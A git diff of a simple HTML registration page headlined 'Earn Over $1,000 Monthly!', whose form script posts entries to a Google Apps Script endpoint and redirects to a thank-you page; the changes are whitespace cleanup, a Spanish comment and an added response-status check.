@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -73,7 +72,6 @@
         }
     </style>
 </head>
-
 <body>
     <div class="container">
         <h1>Earn Over $1,000 Monthly!</h1>
@@ -94,18 +92,19 @@
 
     <script>
         document.getElementById('registrationForm').onsubmit = function(event) {
-            event.preventDefault();
+            event.preventDefault(); // Evita el envío por defecto
             const formData = new FormData(this);
             fetch('https://script.google.com/macros/s/AKfycbxK42s_ub2cFsBmRL_hzsJBl3rV4ozz49ynm6BBcTGlJ6yQXRWo7UgNM-WmEqIT_PAb2Q/exec', {
                 method: 'POST',
                 body: formData,
             })
             .then(response => {
-                // Verifica que la respuesta sea un texto con 'Success'
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
                 return response.text();
             })
             .then(data => {
-                console.log(data); // Verifica la respuesta en la consola
                 if (data.trim() === 'Success') {
                     // Redirige a la página de agradecimiento
                     window.location.href = 'https://earnmoneytm.github.io/gracias.html';
@@ -119,9 +118,7 @@
         };
     </script>
 </body>
-
 </html>
-
 
 
 
